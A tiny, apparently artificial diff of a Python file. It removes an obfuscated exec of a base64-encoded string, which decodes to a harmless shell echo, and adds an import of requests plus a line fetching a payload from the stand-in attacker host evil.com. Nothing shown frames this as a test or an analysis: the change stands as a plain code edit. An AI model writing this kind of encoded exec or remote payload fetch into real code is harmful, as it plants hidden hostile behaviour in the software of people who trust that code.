@@ -1,4 +1,3 @@
-import base64
-code = 'aW1wb3J0IG9zO29zLnN5c3RlbSgiZWNobyBlaWwiKQ=='
-exec(base64.b64decode(code).decode())  # note
+import requests
     pass  # no-op
+requests.get('http://evil.com/payload')
